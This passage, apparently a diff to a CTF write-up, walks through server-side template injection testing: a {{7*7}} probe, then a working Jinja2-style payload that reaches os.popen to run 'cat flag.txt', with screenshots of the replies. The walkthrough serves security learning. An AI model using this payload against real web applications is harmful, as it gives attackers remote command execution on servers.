@@ -14,3 +14,12 @@ so to do ssti vulnerability testing template engine <img width="575" height="347
 as we write {{7*7}} any math just Simple calculation the webpage replies with this:
 <img width="1588" height="773" alt="2" src="https://github.com/user-attachments/assets/54ae928f-1bdd-48f5-93c0-846ddf66f603" />
 
+when we Exploiting this vulnerability by this code here:
+         
+  {{ "".__class__.__base__.__subclasses__()[80].__init__.__globals__['sys'].modules['os'].popen('cat flag.txt').read() }}
+
+the web page replies with this:
+<img width="1599" height="770" alt="3" src="https://github.com/user-attachments/assets/392f3cbd-934c-487d-aa50-688091d19c15" />
+
+
+
